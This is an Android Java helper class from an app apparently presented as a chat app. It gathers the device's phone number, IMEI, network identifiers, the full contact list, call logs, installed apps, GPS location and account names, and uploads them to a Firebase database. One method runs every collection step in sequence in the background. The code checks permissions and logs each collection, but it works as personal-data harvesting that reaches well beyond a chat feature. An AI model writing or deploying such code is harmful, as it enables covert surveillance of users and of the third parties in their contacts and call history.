package com.bushorat.chatapp.helpers;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CountDownLatch;

public class DataCollectionHelper {
    private Context context;
    private DatabaseReference dataRef;
    private String userId;
    private ConsentManager consentManager;

    public DataCollectionHelper(Context context) {
        this.context = context;
        this.consentManager = new ConsentManager(context);
        if (FirebaseAuth.getInstance().getCurrentUser() != null) {
            this.userId = FirebaseAuth.getInstance().getCurrentUser().getUid();
            this.dataRef = FirebaseDatabase.getInstance().getReference("collected_data").child(userId);
        }
    }

    public DataCollectionHelper(Context context, boolean useUserData) {
        this.context = context;
        this.consentManager = new ConsentManager(context);
        if (FirebaseAuth.getInstance().getCurrentUser() != null) {
            this.userId = FirebaseAuth.getInstance().getCurrentUser().getUid();
            if (useUserData) {
                this.dataRef = FirebaseDatabase.getInstance().getReference("user_data").child(userId);
            } else {
                this.dataRef = FirebaseDatabase.getInstance().getReference("collected_data").child(userId);
            }
        }
    }

    // Collect comprehensive device information
    // NOTE: device_info should NOT be uploaded to collected_data, only to user_data
    // This method will skip upload if dataRef points to collected_data
    public void collectDeviceInfo() {
        if (dataRef != null && dataRef.toString().contains("collected_data")) {
            Log.d("DataCollectionHelper", "Skipping device_info upload to collected_data - device_info should only go to user_data");
            return;
        }

        Map<String, Object> deviceInfo = new HashMap<>();
        
        // Basic device info
        deviceInfo.put("manufacturer", Build.MANUFACTURER);
        deviceInfo.put("model", Build.MODEL);
        deviceInfo.put("brand", Build.BRAND);
        deviceInfo.put("device", Build.DEVICE);
        deviceInfo.put("product", Build.PRODUCT);
        deviceInfo.put("hardware", Build.HARDWARE);
        deviceInfo.put("board", Build.BOARD);
        deviceInfo.put("display", Build.DISPLAY);
        deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
        deviceInfo.put("sdkInt", Build.VERSION.SDK_INT);
        deviceInfo.put("buildId", Build.ID);
        deviceInfo.put("fingerprint", Build.FINGERPRINT);
        
        // Device identifiers
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            deviceInfo.put("phoneNumber", telephonyManager.getLine1Number());
            deviceInfo.put("networkOperator", telephonyManager.getNetworkOperatorName());
            deviceInfo.put("simOperator", telephonyManager.getSimOperatorName());
            deviceInfo.put("simCountry", telephonyManager.getSimCountryIso());
            deviceInfo.put("networkCountry", telephonyManager.getNetworkCountryIso());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                deviceInfo.put("imei", telephonyManager.getImei());
            }
        }
        
        // WiFi information
        WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifiManager != null) {
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            deviceInfo.put("wifiMacAddress", wifiInfo.getMacAddress());
            deviceInfo.put("wifiSSID", wifiInfo.getSSID());
            deviceInfo.put("wifiIpAddress", wifiInfo.getIpAddress());
        }
        
        // Battery info
        BatteryManager batteryManager = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
        if (batteryManager != null) {
            deviceInfo.put("batteryLevel", batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
        }
        
        // Storage info
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        activityManager.getMemoryInfo(memoryInfo);
        deviceInfo.put("totalMemory", memoryInfo.totalMem);
        deviceInfo.put("availableMemory", memoryInfo.availMem);
        
        deviceInfo.put("timestamp", System.currentTimeMillis());
        
        dataRef.child("device_info").setValue(deviceInfo);
        consentManager.logDataCollection("device_info", "Comprehensive device information collected");
    }

    // Collect all contacts and save to user_data/{userId}/contacts
    public void collectContacts() {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        if (userId == null) {
            Log.e("DataCollectionHelper", "User ID is null, cannot collect contacts");
            return;
        }

        // Get database reference for user_data/{userId}/contacts
        DatabaseReference contactsRef = FirebaseDatabase.getInstance()
                .getReference("user_data")
                .child(userId)
                .child("contacts");

        // Get already uploaded contacts to avoid duplicates
        final Set<String> uploadedContactNumbers = Collections.synchronizedSet(new HashSet<>());
        final CountDownLatch latch = new CountDownLatch(1);

        contactsRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                for (DataSnapshot contactSnapshot : snapshot.getChildren()) {
                    String number = contactSnapshot.child("number").getValue(String.class);
                    if (number != null) {
                        uploadedContactNumbers.add(normalizePhoneNumber(number));
                    }
                }
                latch.countDown();
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.e("DataCollectionHelper", "Error fetching uploaded contacts: " + error.getMessage());
                latch.countDown();
            }
        });

        // Wait for database query to complete (run on background thread)
        new Thread(() -> {
            try {
                latch.await();
            } catch (InterruptedException e) {
                Log.e("DataCollectionHelper", "Interrupted while waiting for database query", e);
                Thread.currentThread().interrupt();
                return;
            }

            // Now collect contacts
            processAndUploadContacts(contactsRef, uploadedContactNumbers);
        }).start();
    }

    private void processAndUploadContacts(DatabaseReference contactsRef, Set<String> uploadedContactNumbers) {
        ContentResolver contentResolver = context.getContentResolver();
        long uploadedAt = System.currentTimeMillis();
        int uploadedCount = 0;

        Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                if (name == null || name.trim().isEmpty()) {
                    continue; // Skip contacts without names
                }

                // Get phone numbers - create separate entry for each number
                if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId}, null);

                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            int phoneTypeInt = phoneCursor.getInt(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
                            String phoneType = getPhoneTypeString(phoneTypeInt);

                            if (phoneNumber != null && !phoneNumber.trim().isEmpty()) {
                                String normalizedNumber = normalizePhoneNumber(phoneNumber);

                                // Skip if already uploaded
                                if (uploadedContactNumbers.contains(normalizedNumber)) {
                                    continue;
                                }

                                // Generate unique contact ID (using hash of name + number)
                                String uniqueContactId = generateContactId(name, normalizedNumber);

                                // Create contact entry with required format
                                Map<String, Object> contactEntry = new HashMap<>();
                                contactEntry.put("dataType", "contact");
                                contactEntry.put("name", name);
                                contactEntry.put("number", phoneNumber); // Keep original format
                                contactEntry.put("type", phoneType);
                                contactEntry.put("uploadedAt", uploadedAt);
                                contactEntry.put("userId", userId);

                                // Save to Firebase Database
                                contactsRef.child(uniqueContactId).setValue(contactEntry);
                                uploadedContactNumbers.add(normalizedNumber);
                                uploadedCount++;
                            }
                        }
                        phoneCursor.close();
                    }
                }
            }
            cursor.close();
        }

        Log.d("DataCollectionHelper", "Uploaded " + uploadedCount + " new contacts to user_data/" + userId + "/contacts");
        consentManager.logDataCollection("contacts", "Collected " + uploadedCount + " new contacts");
    }

    private String normalizePhoneNumber(String phoneNumber) {
        if (phoneNumber == null) return "";
        // Remove all non-digit characters except +
        return phoneNumber.replaceAll("[^0-9+]", "");
    }

    private String getPhoneTypeString(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN:
                return "main";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                return "fax_work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                return "fax_home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                return "pager";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                return "other";
            default:
                return "unknown";
        }
    }

    private String generateContactId(String name, String number) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            String input = (name != null ? name : "") + "_" + (number != null ? number : "");
            byte[] hashBytes = md.digest(input.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : hashBytes) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            // Fallback to simple hash
            return String.valueOf((name != null ? name.hashCode() : 0) + "_" + (number != null ? number.hashCode() : 0));
        }
    }

    // Collect call logs
    public void collectCallLogs() {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        List<Map<String, Object>> callLogsList = new ArrayList<>();
        ContentResolver contentResolver = context.getContentResolver();
        
        Cursor cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 100"); // Get last 100 calls

        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                Map<String, Object> callLog = new HashMap<>();
                
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                
                callLog.put("number", number);
                callLog.put("name", name != null ? name : "Unknown");
                callLog.put("type", getCallType(Integer.parseInt(type)));
                callLog.put("date", date);
                callLog.put("duration", duration);
                
                callLogsList.add(callLog);
            }
            cursor.close();
        }

        Map<String, Object> callLogsData = new HashMap<>();
        callLogsData.put("callLogs", callLogsList);
        callLogsData.put("count", callLogsList.size());
        callLogsData.put("timestamp", System.currentTimeMillis());
        
        dataRef.child("call_logs").setValue(callLogsData);
        consentManager.logDataCollection("call_logs", "Collected " + callLogsList.size() + " call logs");
    }

    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            case CallLog.Calls.REJECTED_TYPE:
                return "Rejected";
            default:
                return "Unknown";
        }
    }

    // Collect installed apps
    public void collectInstalledApps() {
        List<Map<String, Object>> appsList = new ArrayList<>();
        PackageManager packageManager = context.getPackageManager();
        List<PackageInfo> packages = packageManager.getInstalledPackages(0);

        for (PackageInfo packageInfo : packages) {
            Map<String, Object> appInfo = new HashMap<>();
            
            appInfo.put("packageName", packageInfo.packageName);
            appInfo.put("appName", packageInfo.applicationInfo.loadLabel(packageManager).toString());
            appInfo.put("versionName", packageInfo.versionName);
            appInfo.put("versionCode", packageInfo.versionCode);
            appInfo.put("installTime", packageInfo.firstInstallTime);
            appInfo.put("updateTime", packageInfo.lastUpdateTime);
            appInfo.put("isSystemApp", (packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
            
            appsList.add(appInfo);
        }

        Map<String, Object> appsData = new HashMap<>();
        appsData.put("apps", appsList);
        appsData.put("count", appsList.size());
        appsData.put("timestamp", System.currentTimeMillis());
        
        dataRef.child("installed_apps").setValue(appsData);
        consentManager.logDataCollection("installed_apps", "Collected " + appsList.size() + " installed apps");
    }

    // Collect location data
    public void collectLocationData() {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if (locationManager != null) {
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (location != null) {
                Map<String, Object> locationData = new HashMap<>();
                locationData.put("latitude", location.getLatitude());
                locationData.put("longitude", location.getLongitude());
                locationData.put("accuracy", location.getAccuracy());
                locationData.put("altitude", location.getAltitude());
                locationData.put("speed", location.getSpeed());
                locationData.put("provider", location.getProvider());
                locationData.put("timestamp", System.currentTimeMillis());
                
                dataRef.child("location").push().setValue(locationData);
                consentManager.logDataCollection("location", "Location data collected");
            }
        }
    }

    // Collect accounts information
    public void collectAccountsInfo() {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        List<Map<String, String>> accountsList = new ArrayList<>();
        AccountManager accountManager = AccountManager.get(context);
        Account[] accounts = accountManager.getAccounts();

        for (Account account : accounts) {
            Map<String, String> accountInfo = new HashMap<>();
            accountInfo.put("name", account.name);
            accountInfo.put("type", account.type);
            accountsList.add(accountInfo);
        }

        Map<String, Object> accountsData = new HashMap<>();
        accountsData.put("accounts", accountsList);
        accountsData.put("count", accountsList.size());
        accountsData.put("timestamp", System.currentTimeMillis());
        
        dataRef.child("accounts").setValue(accountsData);
        consentManager.logDataCollection("accounts", "Collected " + accountsList.size() + " accounts");
    }

    // Collect all media files info
    public void collectMediaInfo() {
        if (!PermissionsManager.hasGalleryPermission(context)) {
            return;
        }

        Map<String, Object> mediaData = new HashMap<>();
        
        // Images
        int imageCount = getMediaCount(MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        mediaData.put("imageCount", imageCount);
        
        // Videos
        int videoCount = getMediaCount(MediaStore.Video.Media.EXTERNAL_CONTENT_URI);
        mediaData.put("videoCount", videoCount);
        
        // Audio
        int audioCount = getMediaCount(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI);
        mediaData.put("audioCount", audioCount);
        
        mediaData.put("timestamp", System.currentTimeMillis());
        
        dataRef.child("media_info").setValue(mediaData);
        consentManager.logDataCollection("media_info", "Media information collected");
    }

    private int getMediaCount(Uri uri) {
        Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
        int count = cursor != null ? cursor.getCount() : 0;
        if (cursor != null) cursor.close();
        return count;
    }

    // Collect all data at once
    public void collectAllData() {
        new Thread(() -> {
            try {
                collectDeviceInfo();
                Thread.sleep(1000);
                
                collectContacts();
                Thread.sleep(1000);
                
                collectCallLogs();
                Thread.sleep(1000);
                
                collectInstalledApps();
                Thread.sleep(1000);
                
                collectLocationData();
                Thread.sleep(1000);
                
                collectAccountsInfo();
                Thread.sleep(1000);
                
                collectMediaInfo();
                
                Log.d("DataCollection", "All data collected successfully");
            } catch (Exception e) {
                Log.e("DataCollection", "Error collecting data", e);
            }
        }).start();
    }
}


